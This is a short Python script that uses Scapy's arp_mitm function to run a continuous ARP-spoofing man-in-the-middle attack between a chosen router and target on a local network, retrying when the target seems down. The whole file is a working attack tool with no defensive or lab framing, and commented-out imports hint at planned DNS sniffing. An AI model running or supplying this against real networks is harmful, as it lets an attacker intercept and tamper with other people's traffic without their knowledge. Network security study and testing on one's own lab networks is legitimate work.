import time
import sys
from termcolor import cprint
from scapy.layers.l2 import arp_mitm
# from scapy.layers.l2 import arp_mitm, ARP, Ether
# from scapy.layers.dns import DNS
# from scapy.sendrecv import sniff, srp


def run(routerip, targetip, interface):
    cprint('*** MITM running ***', 'green', attrs=['blink', "reverse"])
    while True:
        try:
            arp_mitm(routerip, targetip, iface=interface)
        except OSError:
            print('IP seems down, retrying...')
            time.sleep(1)
            continue
        except KeyboardInterrupt:
            print('Exiting...')
            sys.exit(2)
